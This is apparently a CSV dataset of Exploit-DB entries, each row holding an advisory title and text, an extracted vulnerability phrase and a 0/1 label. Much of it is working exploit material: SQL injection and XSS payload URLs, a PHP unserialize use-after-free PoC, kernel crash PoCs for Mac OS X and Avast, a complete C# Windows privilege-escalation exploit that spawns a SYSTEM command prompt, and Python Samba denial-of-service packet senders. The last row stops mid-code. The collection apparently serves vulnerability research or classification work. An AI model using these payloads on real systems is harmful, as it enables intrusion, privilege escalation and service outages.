25002,Hornbill Supportworks ITSM 1.0.0 - SQL Injection Summary     SQL Injection Vulnerability in ITSM component of Hornbill Supportworks Application         CVE number: CVE-2013-2594      Impact: High      Vendor homepage: http://www.hornbill.com      Vendor notified: 19/11/2012      Vendor response: This issue has reportedly been fixed but the vendor refused to give version details.      Credit: Joseph Sheridan of ReactionIS     Affected Products     Supportworks ITSM versions 1.0.0 and possibly other versions     Details     There is a SQL injection vulnerability in the ITSM component of the Supportworks Application. The vulnerable file is calldiary.php found in the /reports folder of the webroot. The following URL demonstrates the issue:        http://vulnhost.com/reports/calldiary.php?callref=VULN      This attack can be used to take full control of the host by writing a php webshell document (using mysql 'into outfile') to the webroot.        Impact     An attacker may be able to take full control of the Supportworks server and execute arbitrary operating-system commands.     Solution     Upgrade to the latest available ITSM version - contact Vendor for more details.     http://www.reactionpenetrationtesting.co.uk   http://www.reactionpenetrationtesting.co.uk/research.html   http://www.reactionpenetrationtesting.co.uk/security-testing-services.html,take full control of the Supportworks server and execute arbitrary operating-system commands,1
29201,"Apple Mac OSX 10.4.x - 'Shared_Region_Make_Private_Np' Kernel Function Local Memory Corruption /* source: https://www.securityfocus.com/bid/21349/info  Apple Mac OS X is prone to a local memory-corruption vulnerability. This issue occurs when the operating system fails to handle specially crafted arguments to a system call.   Attackers may exploit this issue to cause a kernel panic, effectively denying further service to legitimate users. Due to the nature of this issue, successful exploits may potentially result in the execution of arbitrary machine code in the context of the affected kernel, but this has not been confirmed.  Mac OS X version 10.4.8 is vulnerable to this issue; other versions may also be affected. */   /*  * Copyright 2006 (c) LMH <lmh@info-pull.com>.  * All Rights Reserved.  * ----             *               .---. .---.   *              :     : o   :    me want cookie and clues! L0W LEVA! - A  J. H  *          _..-:   o :     :-.._    /   *      .-''  '  `---' `---' ""   ``-.      *    .'   ""   '  ""  .    ""  . '  ""  `.   *   :   '.---.,,.,...,.,.,.,..---.  ' ;  *   `. "" `.                     .' "" .' kudos to ilja, kevin and icer.  *    `.  '`.                   .' ' .'           ""proof of concept"" for  *     `.    `-._           _.-' ""  .'  .-------.       MOKB-28-11-2006.  *       `. ""    '""--...--""'  . ' .'  .'  · o   ·`.  *       .'`-._'    "" .     "" _.-'`. :  C o C o A :  *     .'      ```--.....--'''    ' `:_ o      o  :  *   .'    ""     '         ""     ""   ; `.;"";"";""; _'  *  ;         '       ""       '     . ; .' ; ; ;  * ;     '         '       '   ""    .'      .-'  * '  ""     ""   '      ""           ""    _.-'  */  #include <stdio.h> #include <sys/types.h> #include <fcntl.h>  int main() { 		/* shared_region_make_private_np = 300 (xnu-792.6.70),  3rd arg unused */         syscall(300, 0x8000000, 0xdeadface, 0xffffffff);         return 0; }",the operating system fails to handle specially crafted arguments to a system call,0
38122,"PHP 5.4/5.5/5.6 - SplObjectStorage 'Unserialize()' Use-After-Free Yet Another Use After Free Vulnerability in unserialize() with SplObjectStorage  Taoguang Chen <[@chtg](http://github.com/chtg)>  Write Date: 2015.8.27  Release Date: 2015.9.4  A use-after-free vulnerability was discovered in unserialize() with SplObjectStorage object's deserialization and crafted object's __wakeup() magic method that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.  Affected Versions ------------ Affected is PHP 5.6 < 5.6.13 Affected is PHP 5.5 < 5.5.29 Affected is PHP 5.4 < 5.4.45  Credits ------------ This vulnerability was disclosed by Taoguang Chen.  Description ------------       ALLOC_INIT_ZVAL(pentry);     if (!php_var_unserialize(&pentry, &p, s + buf_len, &var_hash TSRMLS_CC)) {       zval_ptr_dtor(&pentry);       goto outexcept;     }     if(Z_TYPE_P(pentry) != IS_OBJECT) {       goto outexcept;     }     ALLOC_INIT_ZVAL(pinf);     if (*p == ',') { /* new version has inf */       ++p;       if (!php_var_unserialize(&pinf, &p, s + buf_len, &var_hash TSRMLS_CC)) {         zval_ptr_dtor(&pinf);         goto outexcept;       }     }   It has been demonstrated many times before that __wakeup() leads to ZVAL is freed from memory. However during deserialization will still allow to use R: or r: to set references to that already freed memory. It is possible to use-after-free attack and execute arbitrary code remotely.  Proof of Concept Exploit ------------ The PoC works on standard MacOSX 10.11 installation of PHP 5.6.12.   <?php  class obj {   var $ryat;   function __wakeup() {     $this->ryat = 1;   } }  $fakezval = ptr2str(1122334455); $fakezval .= ptr2str(0); $fakezval .= ""\x00\x00\x00\x00""; $fakezval .= ""\x01""; $fakezval .= ""\x00""; $fakezval .= ""\x00\x00"";  $inner = 'x:i:1;O:8:""stdClass"":0:{},i:1;;m:a:0:{}'; $exploit = 'a:5:{i:0;i:1;i:1;C:16:""SplObjectStorage"":'.strlen($inner).':{'.$inner.'}i:2;O:3:""obj"":1:{s:4:""ryat"";R:3;}i:3;R:6;i:4;s:'.strlen($fakezval).':""'.$fakezval.'"";}';  $data = unserialize($exploit);  var_dump($data);  function ptr2str($ptr) {   $out = '';   for ($i = 0; $i < 8; $i++) {     $out .= chr($ptr & 0xff);     $ptr >>= 8;   }   return $out; }  ?>   Test the PoC on the command line:   $ php uafpoc.php array(5) {   [0]=>   int(1)   [1]=>   &int(1)   [2]=>   object(obj)#3 (1) {     [""ryat""]=>     &int(1)   }   [3]=>   int(1122334455)  <===  so we can control the memory and create fake ZVAL :)   [4]=>   string(24) ""?v?B????"" }",use-after-free,1
34651,"e-Soft24 Jokes Portal Script Seo 1.0 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/43303/info  e-Soft24 Jokes Portal Script Seo is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  e-Soft24 Jokes Portal Script Seo 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/SearchAction.php?what='""><SCRIPT>alert(String.fromCharCode(88%2C83%2C83))<%2FSCRIPT><MARQUEE+BGCOLOR%3D""RED""><H1>Xss<%2FH1><%2FMARQUEE>&ssub=GO  http://www.example.com/forgot.html => put : '""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><MARQUEE BGCOLOR=""RED""><H1>Xss</H1></MARQUEE> 			 http://www.example.com/scripts/jokes-portal/SearchAction.php?what=%27%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3CMARQUEE+BGCOLOR%3D%22RED%22%3E%3CH1%3EXss%3C%2FH1%3E%3C%2FMARQUEE%3E&ssub=GO",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
30748,"XOOPS 2.0.17.1 Mylinks Module - 'Brokenlink.php' SQL Injection source: https://www.securityfocus.com/bid/26392/info  Xoops Mylinks module is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.  Exploiting this vulnerability could permit remote attackers to pass malicious input to database queries, resulting in the modification of query logic or other attacks.  Xoops 2.0.17.1 is vulnerable; other versions may also be affected.   http://www.example.com.com/modules/mylinks/brokenlink.php?lid=1%20OR%201=2",pass malicious input to database queries,1
25346,"Active Auction House - 'default.asp' Multiple SQL Injections source: https://www.securityfocus.com/bid/13032/info  Active Auction House is reportedly affected by multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/activeauctionsuperstore/default.asp?Sortby=ItemName&SortDir='SQL_INJECTION http://www.example.com/activeauctionsuperstore/default.asp?Sortby='SQL_INJECTION",exploit vulnerabilities in the underlying database implementation,1
40429,"Microsoft Windows 8.1 Update 2 / 10 10586 (x86/x64) - NtLoadKeyEx User Hive Attachment Point Privilege Escalation (MS16-111) /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=865  Windows: NtLoadKeyEx User Hive Attachment Point EoP Platform: Windows 10 10586 (32/64) and 8.1 Update 2, not tested Windows 7 Class: Elevation of Privilege  Summary: The NtLoadKeyEx system call allows an unprivileged user to load registry hives outside of the \Registry\A hidden attachment point which can be used to elevate privileges.   Description:  Windows Vista and above support loading per-user registry hives. Normally calling NtLoadKeyEx would require Backup/Restore privileges to do this making it useless for the average user.. However per-user hives are permitted from a normal user. When calling the Win32 API RegLoadAppKey the hive is loaded under \Registry\A which is a hidden attachment key and doesn’t provide any obvious benefit from an EoP perspective (especially as the root name is a random GUID). However it turns out that you can load the per-user hive to any attachment point such as \Registry\User or \Registry\Machine. Interestingly this works even as a sandboxed user, so it would be an escape out of EPM/Edge/Bits of Chrome etc.  So how can we exploit this? The simplest way I’ve found is to register the hive as the local system ""Classes"" key. This isn’t registered by default, however a quick inspection indicates that local system does indeed refer to this key when trying to access COM registration information. So by putting an appropriate registration in \Registry\User\S-1-5-18_Classes it will be loaded as a local system component and privileged execution is achieved.  Proof of Concept:  I’ve provided a PoC as a C# source code file. You need to compile it first. It uses the issue with NtLoadKeyEx to map a custom hive over the local system’s Classes key. It then registers a type library which is loaded when WinLogon is signaled. I signal WinLogon by locking the screen. It abuses the fact that registered type library paths when passed to LoadTypeLib can be a COM moniker. So I register a COM scriptlet moniker which will be bound when LoadTypeLib parses it, this causes a local scriptlet file to be executed which respawns the original binary to spawn an interactive command prompt. By doing it this way it works on 32 bit and 64 bit without any changes.  Note that it doesn’t need to use the Lock Screen, just this was the first technique I found. Many system services are loading data out of the registry hive, it would just be a case of finding something which could be trivially triggered by the application. In any case imo the bug is the behaviour of NtLoadKeyEx, not how I exploit it.  1) Compile the C# source code file. 2) Execute the PoC executable as a normal user. 3) The PoC should lock the screen. You’ll need to unlock again (do not log out). 4) If successful a system level command prompt should be available on the user’s desktop when you unlock.  Expected Result: You can’t create a per-user hive outside of the hidden attachment point.  Observed Result: Well obviously you can. */  using Microsoft.Win32; using Microsoft.Win32.SafeHandles; using System; using System.Diagnostics; using System.IO; using System.Reflection; using System.Runtime.InteropServices; using System.Text; using System.Threading;  namespace Poc_NtLoadKeyEx_EoP {   class Program   {     [Flags]     public enum AttributeFlags : uint     {       None = 0,       Inherit = 0x00000002,       Permanent = 0x00000010,       Exclusive = 0x00000020,       CaseInsensitive = 0x00000040,       OpenIf = 0x00000080,       OpenLink = 0x00000100,       KernelHandle = 0x00000200,       ForceAccessCheck = 0x00000400,       IgnoreImpersonatedDevicemap = 0x00000800,       DontReparse = 0x00001000,     }      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]     public sealed class UnicodeString     {       ushort Length;       ushort MaximumLength;       [MarshalAs(UnmanagedType.LPWStr)]       string Buffer;        public UnicodeString(string str)       {         Length = (ushort)(str.Length * 2);         MaximumLength = (ushort)((str.Length * 2) + 1);         Buffer = str;       }     }      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]     public sealed class ObjectAttributes : IDisposable     {       int Length;       IntPtr RootDirectory;       IntPtr ObjectName;       AttributeFlags Attributes;       IntPtr SecurityDescriptor;       IntPtr SecurityQualityOfService;        private static IntPtr AllocStruct(object s)       {         int size = Marshal.SizeOf(s);         IntPtr ret = Marshal.AllocHGlobal(size);         Marshal.StructureToPtr(s, ret, false);         return ret;       }        private static void FreeStruct(ref IntPtr p, Type struct_type)       {         Marshal.DestroyStructure(p, struct_type);         Marshal.FreeHGlobal(p);         p = IntPtr.Zero;       }        public ObjectAttributes(string object_name)       {         Length = Marshal.SizeOf(this);         if (object_name != null)         {           ObjectName = AllocStruct(new UnicodeString(object_name));         }         Attributes = AttributeFlags.None;       }        public void Dispose()       {         if (ObjectName != IntPtr.Zero)         {           FreeStruct(ref ObjectName, typeof(UnicodeString));         }         GC.SuppressFinalize(this);       }        ~ObjectAttributes()       {         Dispose();       }     }      [Flags]     public enum LoadKeyFlags     {       None = 0,       AppKey = 0x10,       Exclusive = 0x20,       Unknown800 = 0x800,     }      [Flags]     public enum GenericAccessRights : uint     {       None = 0,       GenericRead = 0x80000000,       GenericWrite = 0x40000000,       GenericExecute = 0x20000000,       GenericAll = 0x10000000,       Delete = 0x00010000,       ReadControl = 0x00020000,       WriteDac = 0x00040000,       WriteOwner = 0x00080000,       Synchronize = 0x00100000,       MaximumAllowed = 0x02000000,     }      public class NtException : ExternalException     {       [DllImport(""kernel32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]       private static extern IntPtr GetModuleHandle(string modulename);        [Flags]       enum FormatFlags       {         AllocateBuffer = 0x00000100,         FromHModule = 0x00000800,         FromSystem = 0x00001000,         IgnoreInserts = 0x00000200       }        [DllImport(""kernel32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]       private static extern int FormatMessage(         FormatFlags dwFlags,         IntPtr lpSource,         int dwMessageId,         int dwLanguageId,         out IntPtr lpBuffer,         int nSize,         IntPtr Arguments       );        [DllImport(""kernel32.dll"")]       private static extern IntPtr LocalFree(IntPtr p);        private static string StatusToString(int status)       {         IntPtr buffer = IntPtr.Zero;         try         {           if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,               GetModuleHandle(""ntdll.dll""), status, 0, out buffer, 0, IntPtr.Zero) > 0)           {             return Marshal.PtrToStringUni(buffer);           }         }         finally         {           if (buffer != IntPtr.Zero)           {             LocalFree(buffer);           }         }         return String.Format(""Unknown Error: 0x{0:X08}"", status);       }        public NtException(int status) : base(StatusToString(status))       {       }     }      public static void StatusToNtException(int status)     {       if (status < 0)       {         throw new NtException(status);       }     }      [DllImport(""ntdll.dll"")]     public static extern int NtLoadKeyEx(ObjectAttributes DestinationName, ObjectAttributes FileName, LoadKeyFlags Flags,         IntPtr TrustKeyHandle, IntPtr EventHandle, GenericAccessRights DesiredAccess, out SafeRegistryHandle KeyHandle, int Unused);      static string scriptlet_code = @""<?xml version='1.0'?> <package> <component id='giffile'> <registration   description='Dummy'   progid='giffile'   version='1.00'   remotable='True'>  </registration> <script language='JScript'> <![CDATA[   new ActiveXObject('Wscript.Shell').exec('%CMDLINE%'); ]]> </script> </component> </package> "";      public enum TokenInformationClass     {       TokenSessionId = 12     }      [DllImport(""ntdll.dll"")]     public static extern int NtClose(IntPtr handle);      [DllImport(""ntdll.dll"", CharSet = CharSet.Unicode)]     public static extern int NtOpenProcessTokenEx(           IntPtr ProcessHandle,           GenericAccessRights DesiredAccess,           AttributeFlags HandleAttributes,           out IntPtr TokenHandle);      public sealed class SafeKernelObjectHandle   : SafeHandleZeroOrMinusOneIsInvalid     {       public SafeKernelObjectHandle()         : base(true)       {       }        public SafeKernelObjectHandle(IntPtr handle, bool owns_handle)         : base(owns_handle)       {         SetHandle(handle);       }        protected override bool ReleaseHandle()       {         if (!IsInvalid)         {           NtClose(this.handle);           this.handle = IntPtr.Zero;           return true;         }         return false;       }     }      public enum TokenType     {       Primary = 1,       Impersonation = 2     }      [DllImport(""ntdll.dll"", CharSet = CharSet.Unicode)]     public static extern int NtDuplicateToken(     IntPtr ExistingTokenHandle,     GenericAccessRights DesiredAccess,     ObjectAttributes ObjectAttributes,     bool EffectiveOnly,     TokenType TokenType,     out IntPtr NewTokenHandle     );      public static SafeKernelObjectHandle DuplicateToken(SafeKernelObjectHandle existing_token)     {       IntPtr new_token;              using (ObjectAttributes obja = new ObjectAttributes(null))       {         StatusToNtException(NtDuplicateToken(existing_token.DangerousGetHandle(),           GenericAccessRights.MaximumAllowed, obja, false, TokenType.Primary, out new_token));         return new SafeKernelObjectHandle(new_token, true);       }     }      public static SafeKernelObjectHandle OpenProcessToken()     {       IntPtr new_token;       StatusToNtException(NtOpenProcessTokenEx(new IntPtr(-1),         GenericAccessRights.MaximumAllowed, AttributeFlags.None, out new_token));       using (SafeKernelObjectHandle ret = new SafeKernelObjectHandle(new_token, true))       {         return DuplicateToken(ret);       }     }      [DllImport(""ntdll.dll"")]     public static extern int NtSetInformationToken(       SafeKernelObjectHandle TokenHandle,       TokenInformationClass TokenInformationClass,       byte[] TokenInformation,       int TokenInformationLength);      public static void SetTokenSessionId(SafeKernelObjectHandle token, int session_id)     {       byte[] buffer = BitConverter.GetBytes(session_id);             NtSetInformationToken(token, TokenInformationClass.TokenSessionId,          buffer, buffer.Length);     }      static Tuple<EventWaitHandle, EventWaitHandle> GetEvents()     {       EventWaitHandle user_ev = new EventWaitHandle(false, EventResetMode.AutoReset, @""Global\ntloadkey_event_user_wait"");       EventWaitHandle sys_ev = new EventWaitHandle(false, EventResetMode.AutoReset, @""Global\ntloadkey_event_sys_wait"");        return new Tuple<EventWaitHandle, EventWaitHandle>(user_ev, sys_ev);     }      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]     struct STARTUPINFO     {       public Int32 cb;       public string lpReserved;       public string lpDesktop;       public string lpTitle;       public Int32 dwX;       public Int32 dwY;       public Int32 dwXSize;       public Int32 dwYSize;       public Int32 dwXCountChars;       public Int32 dwYCountChars;       public Int32 dwFillAttribute;       public Int32 dwFlags;       public Int16 wShowWindow;       public Int16 cbReserved2;       public IntPtr lpReserved2;       public IntPtr hStdInput;       public IntPtr hStdOutput;       public IntPtr hStdError;     }      [StructLayout(LayoutKind.Sequential)]     internal struct PROCESS_INFORMATION     {       public IntPtr hProcess;       public IntPtr hThread;       public int dwProcessId;       public int dwThreadId;     }      enum CreateProcessFlags     {       CREATE_BREAKAWAY_FROM_JOB = 0x01000000,       CREATE_DEFAULT_ERROR_MODE = 0x04000000,       CREATE_NEW_CONSOLE = 0x00000010,       CREATE_NEW_PROCESS_GROUP = 0x00000200,       CREATE_NO_WINDOW = 0x08000000,       CREATE_PROTECTED_PROCESS = 0x00040000,       CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,       CREATE_SEPARATE_WOW_VDM = 0x00000800,       CREATE_SHARED_WOW_VDM = 0x00001000,       CREATE_SUSPENDED = 0x00000004,       CREATE_UNICODE_ENVIRONMENT = 0x00000400,       DEBUG_ONLY_THIS_PROCESS = 0x00000002,       DEBUG_PROCESS = 0x00000001,       DETACHED_PROCESS = 0x00000008,       EXTENDED_STARTUPINFO_PRESENT = 0x00080000,       INHERIT_PARENT_AFFINITY = 0x00010000     }      [DllImport(""advapi32.dll"", SetLastError = true, CharSet = CharSet.Auto)]     static extern bool CreateProcessAsUser(       IntPtr hToken,       string lpApplicationName,       string lpCommandLine,       IntPtr lpProcessAttributes,       IntPtr lpThreadAttributes,       bool bInheritHandles,       CreateProcessFlags dwCreationFlags,       IntPtr lpEnvironment,       string lpCurrentDirectory,       ref STARTUPINFO lpStartupInfo,       out PROCESS_INFORMATION lpProcessInformation);      static void SpawnInteractiveCmd(int sessionid)     {       Tuple<EventWaitHandle, EventWaitHandle> events = GetEvents();       Console.WriteLine(""Got Events"");       events.Item1.Set();       events.Item2.WaitOne();       SafeKernelObjectHandle token = OpenProcessToken();       SetTokenSessionId(token, sessionid);        STARTUPINFO startInfo = new STARTUPINFO();       startInfo.cb = Marshal.SizeOf(startInfo);       PROCESS_INFORMATION procInfo;        CreateProcessAsUser(token.DangerousGetHandle(), null, ""cmd.exe"",          IntPtr.Zero, IntPtr.Zero, false, CreateProcessFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref startInfo, out procInfo);     }      [DllImport(""user32.dll"")]     static extern bool LockWorkStation();      static void DoExploit()     {       Console.WriteLine(""{0}"", Assembly.GetCallingAssembly().Location);       Tuple<EventWaitHandle, EventWaitHandle> events = GetEvents();        string cmdline = String.Format(@""""""{0}"""" {1}"",         Assembly.GetCallingAssembly().Location.Replace('\\', '/'), Process.GetCurrentProcess().SessionId);       string scriptlet_path = Path.GetFullPath(""dummy.sct"");       File.WriteAllText(scriptlet_path, scriptlet_code.Replace(""%CMDLINE%"", cmdline), Encoding.ASCII);       Console.WriteLine(""{0}"", scriptlet_path);       string scriptlet_url = ""script:"" + new Uri(scriptlet_path).AbsoluteUri;       Console.WriteLine(""{0}"", scriptlet_url);       string reg_name = @""\Registry\User\S-1-5-18_Classes"";       string path = @""\??\"" + Path.GetFullPath(""dummy.hiv"");       File.Delete(""dummy.hiv"");       ObjectAttributes KeyName = new ObjectAttributes(reg_name);       ObjectAttributes FileName = new ObjectAttributes(path);       SafeRegistryHandle keyHandle;        StatusToNtException(NtLoadKeyEx(KeyName,         FileName, LoadKeyFlags.AppKey, IntPtr.Zero,         IntPtr.Zero, GenericAccessRights.GenericAll, out keyHandle, 0));        RegistryKey key = RegistryKey.FromHandle(keyHandle);       RegistryKey typelib_key = key.CreateSubKey(""TypeLib"").CreateSubKey(""{D597DEED-5B9F-11D1-8DD2-00AA004ABD5E}"").CreateSubKey(""2.0"").CreateSubKey(""0"");       typelib_key.CreateSubKey(""win32"").SetValue(null, scriptlet_url);       typelib_key.CreateSubKey(""win64"").SetValue(null, scriptlet_url);        Console.WriteLine(""Handle: {0} - Key {1} - Path {2}"", keyHandle.DangerousGetHandle(), reg_name, path);       Console.WriteLine(""Lock screen and re-login."");       LockWorkStation();       events.Item1.WaitOne();       typelib_key.DeleteSubKey(""win32"");       typelib_key.DeleteSubKey(""win64"");       File.Delete(scriptlet_path);       typelib_key.Close();       key.Close();             events.Item2.Set();     }      static void Main(string[] args)     {       try       {         if (args.Length > 0)         {           SpawnInteractiveCmd(int.Parse(args[0]));         }         else         {           DoExploit();         }       }       catch (Exception ex)       {         Console.WriteLine(ex.Message);       }     }   } }",load registry hives outside of the \Registry\A hidden attachment point which can be used to elevate privileges,0
10106,"Avast! 4.8.1351.0 AntiVirus - 'aswMon2.sys' Kernel Memory Corruption /* Avast 4.8.1351.0 antivirus aswMon2.sys Kernel Memory Corruption  *  * Author: Giuseppe 'Evilcry' Bonfa'  * E-Mail: evilcry _AT_ gmail _DOT_ com  * Website: http://evilcry.netsons.org  *          http://evilcodecave.blogspot.com   *          http://evilfingers.com  *  * Vendor: Notified  *  * No L.P.E. for kiddies  * /  #define WIN32_LEAN_AND_MEAN #include < windows.h> #include < stdio.h>   BOOL OpenDevice(PWSTR DriverName, HANDLE *lphDevice) //taken from esagelab {         WCHAR DeviceName[MAX_PATH];         HANDLE hDevice;          if ((GetVersion() & 0xFF) >= 5)          {                 wcscpy(DeviceName, L""\\\\.\\Global\\"");         }          else          {                 wcscpy(DeviceName, L""\\\\.\\"");         }          wcscat(DeviceName, DriverName);          printf(""Opening.. %S\n"", DeviceName);          hDevice = CreateFileW(DeviceName, GENERIC_READ |          GENERIC_WRITE, 0, NULL, OPEN_EXISTING,                 FILE_ATTRIBUTE_NORMAL, NULL);          if (hDevice == INVALID_HANDLE_VALUE)         {                 printf(""CreateFile() ERROR %d\n"", GetLastError());                 return FALSE;         }          *lphDevice = hDevice;         return TRUE; }  int main() {         HANDLE hDev = NULL;         DWORD Junk;          if(!OpenDevice(L""aswMon"",&hDev))         {                 printf(""Unable to access aswMon"");                 return(0);         }          char *Buff = (char *)VirtualAlloc(NULL, 0x288, MEM_RESERVE |          MEM_COMMIT, PAGE_EXECUTE_READWRITE);          if (Buff)         {                 memset(Buff, 'A', 0x288);                 DeviceIoControl(hDev,0xB2C80018,Buff,                 0x288,Buff,0x288,&Junk,(LPOVERLAPPED)NULL);                 printf(""DeviceIoControl Executed..\n"");          }             else         {                 printf(""VirtualAlloc() ERROR %d\n"", GetLastError());         }           return(0); }",Memory Corruption,1
32537,"All In One 1.4 Control Panel - 'cp_polls_results.php' SQL Injection source: https://www.securityfocus.com/bid/31949/info  All In One Control Panel (AIOCP) is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  AIOCP 1.4 is vulnerable; other versions may also be affected.   http://www.example.com/public/code/cp_polls_results.php?poll_language=eng&poll_id=-0+union+select+0,1,2,version(),4,5,6--","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
12588,"Samba 3.4.7/3.5.1 - Denial of Service =============================================================================== stratsec Security Advisory: SS-2010-005 ===============================================================================  Title:           Samba Multiple DoS Vulnerabilities Version:         1.0 Issue type:      Multiple Affected vendor: Samba Release date:    12/05/2010 Discovered by:   Laurent Gaffié Issue status:    Patch available  ===============================================================================  Summary -------  Two vulnerabilities were discovered within in the Samba Smbd daemon which allow an attacker to trigger a null pointer dereference or an uninitialized variable  read by sending a specific 'Sessions Setup AndX' query. Successful exploitation of these issues will result in a denial of service.  Description -----------  The Server Message Block (SMB) protocol, also known as Common Internet File  System (CIFS) acts as an application-layer protocol to provide shared access to files, printers and Inter-Process Communication (IPC). It is also a transport  for Distributed Computing Environment / Remote Procedure Call (DCE / RPC)  operations. After negotiating an SMB communication the client sends a  'Session Setup AndX' packet to negotiate a session in order to be able to  connect on a specific share.  To trigger the null pointer dereference, the client needs to send a crafted SMB 'Negotiate Protocol' query with the SMB header 'Flags2' set to '0x0003'  (no Unicode), followed by a Session Setup AndX request with the SMB header  'Flags2' set to '0x8003' (Unicode). This sequence will result in a crash within the Smbd process.   The uninitialised Variable Read issue, can be triggered if the client sends a  crafted 'Session Setup AndX' with a 'security blob length' value set to  '\xff\xff'.  Impact ------  A remote attacker can cause a denial of service within the Samba daemon   Affected products -----------------  Samba <=3.4.7 and Samba <= 3.5.1  Proof of concept ----------------  To trigger the uninitialised variable read issue, the following Python  proof of concept is available:  import sys,socket from socket import *  if len(sys.argv)<=1:      sys.exit('Usage: python smbd.py 10.0.0.12')  host = sys.argv[1],445  packetnego=( ""\x00\x00\x00\xaa"" ""\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x03\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xca\x00\x00\x00\x00"" ""\x00\x87\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50"" ""\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x1a\x45\x4e\x49"" ""\x58\x20\x43\x4f\x52\x45\x00\x02\x4d\x49\x43\x52\x4f\x53\x4f\x46"" ""\x54\x20\x4e\x45\x54\x57\x4f\x52\x4b\x53\x20\x31\x2e\x30\x33\x00"" ""\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64"" ""\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75"" ""\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30"" ""\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e"" ""\x54\x20\x4c\x4d\x20\x76\x2e\x31\x32\x00"" )  payload=( ""\x00\x00\x01\xa3"" ""\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x03\x80\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x41\x00\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xca\x00\x00\x00"" ""\x00\x0d\x75\x00\xd6\x00\x04\x11\x0a\x00\x00\x00\x00\x00\x00\x00"" ""\x18\x00\x18\x00\x00\x00\x00\x00\xd4\x00\x00\x00\x99\x00\x36\xed"" ""\x7f\xf4\x6b\xeb\x15\x65\x2e\xb5\xc9\x70\xbe\x39\xfa\x89\x56\x5b"" ""\xb0\xc2\x56\x40\x11\x6c\xe6\x33\x1e\x93\x02\xd3\xd3\x2e\x17\xad"" ""\x1f\x37\x23\xcf\x7e\x4c\xd7\x64\xbe\xd5\xdc\x1f\x23\xe0\x69\x41"" ""\x00\x64\x00\x6d\x00\x69\x00\x6e\x00\x69\x00\x73\x00\x74\x00\x72"" ""\x00\x61\x00\x74\x00\x65\x00\x75\x00\x72\x00\x00\x00\x4e\x00\x54"" ""\x00\x34\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77"" ""\x00\x73\x00\x20\x00\x4e\x00\x54\x00\x20\x00\x31\x00\x33\x00\x38"" ""\x00\x31\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f"" ""\x00\x77\x00\x73\x00\x20\x00\x4e\x00\x54\x00\x20\x00\x34\x00\x2e"" ""\x00\x30\x00\x00\x00\x00\x00\x04\xff\x00\x00\x00\x00\x00\x01\x00"" ""\x31\x00\x00\x5c\x00\x5c\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x31"" ""\x00\x36\x00\x38\x00\x2e\x00\x30\x00\x2e\x00\x31\x00\x30\x00\x34"" ""\x00\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f"" ""\x3f\x3f\x00"" )  s = socket(AF_INET, SOCK_STREAM) s.connect(host)  s.send(''.join(packetnego)) s.send(''.join(payload))   To trigger the null pointer dereference issue this Python proof of concept is available:  import sys,socket from socket import *  if len(sys.argv)<=1:      sys.exit('python smbd.py 10.0.0.12')  host = 